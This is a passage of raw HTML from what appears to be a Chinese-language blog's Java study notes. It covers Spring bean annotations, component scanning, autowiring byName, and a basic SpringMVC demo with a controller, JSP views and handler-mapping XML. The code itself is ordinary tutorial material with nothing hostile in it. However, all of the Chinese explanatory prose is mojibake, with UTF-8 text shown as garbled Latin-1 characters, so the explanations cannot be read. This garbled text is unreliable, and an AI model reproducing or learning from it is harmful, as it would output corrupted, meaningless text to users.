class="code"><pre><span class="line">HelloWorld a= <span class="keyword">new</span> HelloWorld();</span><br><span class="line">a.setMessage(<span class="string">"byc_404"</span>);</span><br></pre></td></tr></table></figure><p>springä¸­å®ä¾‹åŒ–beané™¤äº†ç®€å•çš„ä½¿ç”¨æ„é€ æ–¹æ³•çš„æ„é€ å™¨å®ä¾‹åŒ–ã€‚è¿˜æœ‰é™æ€å·¥å‚å®ä¾‹åŒ–,å®ä¾‹å·¥å‚æ–¹å¼å®ä¾‹åŒ–ã€‚è¿™äº›æˆ‘ä¸ªäººè®¤ä¸ºå¯ä»¥æš‚æ—¶ä¸ç”¨æ·±å…¥äº†è§£ã€‚ä¸»è¦è¿˜æ˜¯ç†è§£äº†IOC,ä¾èµ–æ³¨å…¥è¿™æ ·çš„ç†å¿µã€‚ç”¨èµ·æ¥å°±æœ‰æ˜ç¡®çš„æ€è·¯äº†ã€‚</p><ul><li>beanè£…é…</li></ul><p>å‰é¢ä¼¼ä¹ä¸€ç›´åœ¨è¯´å¾—ä½¿ç”¨xmlæ–‡ä»¶è¿›è¡Œbeançš„æŒ‡å®šã€‚ä½†å®é™…ä¸Šå¯ä»¥ä¸ä½¿ç”¨xmlè¿›è¡Œé…ç½®ã€‚xmlé…ç½®å®é™…å¯èƒ½å­˜åœ¨éš¾ä»¥ç»´æŠ¤çš„ç¼ºç‚¹ã€‚å› æ­¤å¯ä»¥ä½¿ç”¨å…¶ä»–æ–¹æ³•è¿›è¡Œè£…é…ã€‚</p><p>å¯ä»¥ä½¿ç”¨Annotationæ¥è¿›è¡Œé…ç½®ã€‚<br>å¸¸ç”¨çš„å‡ ä¸ªæ³¨è§£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@Required @Requiredæ³¨é‡Šåº”ç”¨äºbeanå±æ€§çš„setteræ–¹æ³•ï¼Œå®ƒè¡¨æ˜å—å½±å“çš„beanå±æ€§åœ¨é…ç½®æ—¶å¿…é¡»æ”¾åœ¨XMLé…ç½®æ–‡ä»¶ä¸­</span><br><span class="line">@Component å¯ä»¥ä½¿ç”¨æ­¤æ³¨è§£æè¿°Springä¸­çš„Beanï¼Œä½†å®ƒæ˜¯ä¸€ä¸ªæ³›åŒ–çš„æ¦‚å¿µï¼Œä»…ä»…è¡¨ç¤ºä¸€ä¸ªç»„ä»¶ï¼ˆBeanï¼‰ï¼Œå¹¶ä¸”å¯ä»¥ä½œç”¨åœ¨ä»»ä½•å±‚æ¬¡ã€‚ä½¿ç”¨æ—¶åªéœ€å°†è¯¥æ³¨è§£æ ‡æ³¨åœ¨ç›¸åº”ç±»ä¸Šå³å¯ã€‚</span><br><span class="line">@Repository ç”¨äºå°†æ•°æ®è®¿é—®å±‚ï¼ˆDAOå±‚ï¼‰çš„ç±»æ ‡è¯†ä¸ºSpringä¸­çš„Beanï¼Œå…¶åŠŸèƒ½ä¸@Component ç›¸åŒã€‚</span><br><span class="line">@Service é€šå¸¸ä½œç”¨åœ¨ä¸šåŠ¡å±‚ï¼ˆService å±‚ï¼‰ï¼Œç”¨äºå°†ä¸šåŠ¡å±‚çš„ç±»æ ‡è¯†ä¸ºSpringä¸­çš„Beanï¼Œå…¶åŠŸèƒ½ä¸@Componentç›¸åŒã€‚</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>é€šå¸¸æˆ‘ä»¬åœ¨ç±»ä¸­æ³¨æ˜äº†ç›¸å…³çš„annotationåï¼Œbeans.xmlé…ç½®å¦‚ä¸‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/context/spring-context.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--ä½¿ç”¨contextå‘½åç©ºé—´ï¼Œé€šçŸ¥springæ‰«ææŒ‡å®šç›®å½•ï¼Œè¿›è¡Œæ³¨è§£çš„è§£æ--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"top.bycsec"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±ä¼šåœ¨é€‰å®šçš„åŒ…é‡Œè‡ªåŠ¨å¯»æ‰¾beanäº†ã€‚</p><p>åŒæ ·æˆ‘ä»¬è¿˜å¯ä»¥è‡ªåŠ¨è£…é…bean.</p><p>TextEditor</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TextEditor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> SpellChecker spellChecker;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSpellChecker</span><span class="params">( SpellChecker spellChecker )</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.spellChecker = spellChecker;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> SpellChecker <span class="title">getSpellChecker</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> spellChecker;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">spellCheck</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        spellChecker.checkSpelling();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SpellChecker</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpellChecker</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SpellChecker</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Inside SpellChecker constructor."</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkSpelling</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Inside checkSpelling."</span> );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MainApp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainApp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"beans.xml"</span>);</span><br><span class="line">        TextEditor te = (TextEditor) context.getBean(<span class="string">"textEditor"</span>);</span><br><span class="line">        te.spellCheck();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>beans.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/context/spring-context.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Definition for textEditor bean --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"textEditor"</span> <span class="attr">class</span>=<span class="string">"top.bycsec.TextEditor"</span> <span class="attr">autowire</span>=<span class="string">"byName"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"byc_404"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Definition for spellChecker bean --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"spellChecker"</span> <span class="attr">class</span>=<span class="string">"top.bycsec.SpellChecker"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨è‡ªåŠ¨è£…é…,ä¹Ÿå°±æ˜¯é…ç½®beançš„autowireå±æ€§ã€‚æ¯”å¦‚æ­¤å¤„çš„byNameå°±æ˜¯æŒ‡ï¼š    æ ¹æ® Property çš„ name è‡ªåŠ¨è£…é…ï¼Œå¦‚æœä¸€ä¸ª Bean çš„ name å’Œå¦ä¸€ä¸ª Bean ä¸­çš„ Property çš„ name ç›¸åŒï¼Œåˆ™è‡ªåŠ¨è£…é…è¿™ä¸ª Bean åˆ° Property ä¸­ã€‚è¿™é‡Œæˆ‘ä»¬textEditorè¿™ä¸ªbeanå®šä¹‰è®¾ç½®ä¸ºè‡ªåŠ¨è£…é…byNameï¼Œå¹¶ä¸”å®ƒåŒ…å«spellCheckerå±æ€§ï¼ˆå³å®ƒæœ‰ä¸€ä¸ª setSpellChecker(â€¦) æ–¹æ³•ï¼‰ï¼Œé‚£ä¹ˆSpringå°±ä¼šæŸ¥æ‰¾å®šä¹‰åä¸ºspellCheckerçš„beanï¼Œå¹¶ä¸”ç”¨å®ƒæ¥è®¾ç½®è¿™ä¸ªå±æ€§<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/27.PNG" class="lazyload" data-srcset="27.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å¦‚æœæˆ‘ä»¬ä¸ç”¨è‡ªåŠ¨è°ƒç”¨ã€‚é‚£ä¹ˆbeans.xmlä¸­çš„é…ç½®å°±éœ€è¦é¢å¤–è®¾ç½®property</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"textEditor"</span> <span class="attr">class</span>=<span class="string">"top.bycsec.TextEditor"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"spellChecker"</span> <span class="attr">ref</span>=<span class="string">"spellChecker"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"byc_404"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åŒç†ã€‚æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨byTypeç­‰autowireå±æ€§å€¼æ¥è¿›è¡Œè‡ªåŠ¨è£…é…ã€‚</p><p>ä»Šå¤©å…ˆçœ‹åˆ°è¿™ã€‚springçš„å†…å®¹è¿˜æ˜¯æ¯”è¾ƒå¤šçš„</p><h3 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h3><p>ä»Šå¤©ç®€å•å†™ä¸ªspringmvcçš„demoã€‚å…¶å®çœ‹äº†çœ¼å»–é›ªå³°è€å¸ˆçš„springæ•™ç¨‹ã€‚å‘ç°springçš„é¡¹ç›®åŸºæœ¬éƒ½æ˜¯mavenæ„å»ºçš„ã€‚å®é™…ä¸Šæˆ‘ä»¬å°±ç®—å•çº¯ä½¿ç”¨ideaä¸­springmvcå¼€å‘ï¼Œä¹Ÿå¯ä»¥åŠ å…¥mavenç»“æ„ã€‚</p><p>æˆ‘ä¸ªäººçœ‹äº†ä¸‹ç½‘ä¸Šcsdnçš„å‡ ç§å†™æ³•ã€‚æœ‰ç‚¹æƒŠè®¶æœ‰çš„æ ¹æœ¬æ²¡æœ‰å†™å‡ºmvcçš„ä½œç”¨,æœ‰çš„æ–¹æ³•å®Œå…¨æ‹˜æ³¥äºåŸæ¥servletçš„å†™æ³•,æ²¡æœ‰ç”¨ä¸Šspringè‡ªå·±çš„ä¾èµ–ã€‚æœ€åæ‰¾åˆ°ä¸€ä¸ªé˜¿é‡Œäº‘çš„demoæ‰çœŸæ­£ç†è§£äº†å…¶ç»“æ„ã€‚ä¸‹é¢æ¥å®é™…æ“ä½œä¸‹ã€‚</p><p>é¦–å…ˆideaåˆ›å»ºspringmvcé¡¹ç›®ã€‚å½“ç„¶åˆšåˆšæåˆ°äº†åˆ›å»ºmavené¡¹ç›®ç„¶åå¼•å…¥springä¾èµ–ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚è¿™é‡Œæˆ‘ä»¬å°±æš‚ä¸”å…ˆä½¿ç”¨ideaæ¥å¸®åŠ©æˆ‘ä»¬ç›´æ¥å¤„ç†å¥½springçš„ä¾èµ–å§ã€‚</p><p>åˆšåˆ›å»ºå®Œé¡¹ç›®é¦–å…ˆè¦æ³¨æ„ä¸€ç‚¹ã€‚éœ€è¦åœ¨ProjectStructure =&gt; Artifact ä¸­å°†ä¸¤ä¸ªspringçš„ä¾èµ–åŠ å…¥åˆ°WEB-INF/libä¸­ã€‚å¦åˆ™å¾…ä¼šæˆ‘ä»¬ä½¿ç”¨tomcatéƒ¨ç½²æ—¶ä¼šæŠ¥é”™ã€‚<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/28.PNG" class="lazyload" data-srcset="28.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ¥ä¸‹æ¥å…ˆç”¨ä¸åŠ æ³¨è§£çš„æ–¹æ³•å†™ä¸€ä¸ªclassã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.Controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Helloworld</span> <span class="keyword">implements</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ModelAndView <span class="title">handleRequest</span><span class="params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ModelAndView modelAndView = <span class="keyword">new</span> ModelAndView();</span><br><span class="line">        modelAndView.addObject(<span class="string">"name"</span>,<span class="string">"byc_404"</span>);</span><br><span class="line">        modelAndView.setViewName(<span class="string">"hello"</span>);</span><br><span class="line">        <span class="keyword">return</span> modelAndView;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åº•ä¸‹addObjectæ˜¯åŠ è½½æ¨¡å‹æ•°æ®ã€‚setViewNameåˆ™æ˜¯é€‰å®šæ¨¡å‹è§†å›¾ã€‚è¿™é‡Œè§†å›¾ä¸ä½¿ç”¨hello.jspè€Œæ˜¯helloæ˜¯æ–¹ä¾¿ä¹¦å†™ã€‚æˆ‘ä»¬åé¢ç›´æ¥åœ¨é…ç½®ä¸­å®šä¹‰åç¼€å³å¯ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page isELIgnored=<span class="string">"false"</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Hello World&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">Hello $&#123;name&#125;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>hello.jsp ä½¿ç”¨SpELè¡¨è¾¾å¼ã€‚å³è·å–æˆ‘ä»¬åˆšåˆšçš„æ¨¡å‹æ•°æ®è¾“å‡ºåˆ°è§†å›¾ã€‚<br>ç„¶åæ˜¯é¡¹ç›®åˆ›å»ºæ—¶è‡ªåŠ¨ç”Ÿæˆçš„dispatcher-servlet.xmlã€‚è¿™é‡Œå¯ä»¥ä¿®æ”¹æˆ‘ä»¬beançš„ç›¸å…³å‚æ•°ã€‚æ¯”å¦‚æ­¤å¤„è®¾ç½®è·¯ç”±<code>/helloworld</code>ã€‚åˆ©ç”¨beanidè®©å…¶å¯¹åº”classä¸ºHelloWorld.ä»¥åŠè§†å›¾æ˜¯åœ¨webæ ¹ç›®å½•ä¸‹æ‰¾åç¼€ä¸ºjspçš„æ–‡ä»¶ã€‚<br>é…ç½®æ–‡ä»¶beanéƒ¨åˆ†å¦‚ä¸‹ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"handlerMapping"</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.handler.SimpleUrlHandlerMapping"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"mappings"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">props</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">"/helloworld"</span>&gt;</span>testHandler<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">props</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"testHandler"</span> <span class="attr">class</span>=<span class="string">"top.bycsec.Helloworld"</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>/<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suffix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>.jsp<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¹‹ååŠ è½½tomcaté…ç½®è·‘èµ·æ¥å³å¯ã€‚è®¿é—®æ ¹ç›®å½•æ˜¯index.jspå†…å®¹ã€‚è®¿é—®<code>/helloworld</code>åˆ™æ˜¯hello.jsp<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/29.PNG" class="lazyload" data-srcset="29.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å½“ç„¶ã€‚è¿™ç§å†™æ³•è‚¯å®šæ˜¯éº»çƒ¦äº†ã€‚åˆšå¥½æ˜¨å¤©å­¦è¿‡äº†spring ä¸­è‡ªåŠ¨è£…è½½beançš„ç”¨æ³•ã€‚é‚£ä¹ˆæ­¤å¤„å½“ç„¶ä¹Ÿå¯ä»¥åˆ©ç”¨æ³¨è§£+é…ç½®è‡ªåŠ¨è£…è½½bean</p><p>æ–°å†™ä¸€ä¸ªAnnotationHandlerç±»ã€‚è¿™é‡Œä½¿ç”¨æ³¨è§£<code>@Controller</code>å°†å…¶ç½®ä¸ºæ§åˆ¶å™¨ã€‚åŒæ—¶è®¾å®šå…¶è·¯ç”±ä¸º<code>/mdoel</code>ã€‚æ•°æ®ä¸è§†å›¾è·Ÿåˆšåˆšå·®ä¸å¤šã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AnnotationHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/model"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ModelAndView  <span class="title">modelAndViewTest</span><span class="params">()</span></span>&#123;</span><br><span class="line">        ModelAndView modelAndView = <span class="keyword">new</span> ModelAndView();</span><br><span class="line">        modelAndView.addObject(<span class="string">"name"</span>,<span class="string">"byc_404"</span>);</span><br><span class="line">        modelAndView.setViewName(<span class="string">"show"</span>);</span><br><span class="line">        <span class="keyword">return</span> modelAndView;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>show.jsp</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page isELIgnored=<span class="string">"false"</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Model&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">Testing model by $&#123;name&#125;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>dispatcher-servlet.xml</p><figure class="highlight 